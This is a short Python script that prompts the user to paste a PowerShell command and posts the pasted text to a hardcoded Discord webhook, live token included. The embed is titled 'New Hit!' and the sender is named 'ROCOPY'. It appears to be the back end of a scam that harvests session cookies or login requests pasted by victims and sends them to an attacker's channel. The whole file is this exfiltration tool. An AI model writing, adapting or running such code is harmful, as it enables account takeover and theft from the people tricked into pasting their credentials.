import requests
import json

webhook_url = "https://discord.com/api/webhooks/1130067394434441256/qMPy-LM8tCl3dhyyxDVLtdlUSunAz-aW4ZNBr0j_9E0w0uGPM6r6uLXzGuldz8I_KGTT"

print("Please paste your PowerShell command (press Enter twice to finish):")
ps_command = ""
while True:
    line = input()
    if line:
        ps_command += line + "\n"
    else:
        break

data = {
    "username": "ROCOPY",
    "avatar_url": "https://img.freepik.com/premium-vector/rc-creative-logo_786241-26.jpg?w=2000",
    "embeds": [
        {
            "title": "New Hit!",
            "description": ps_command,
            "color": 16777215
        }
    ]
}

response = requests.post(webhook_url, data=json.dumps(data), headers={"Content-Type": "application/json"})

if response.status_code == 204:
    print("Command sent successfully!")
else:
    print("An error occurred while sending the command.")
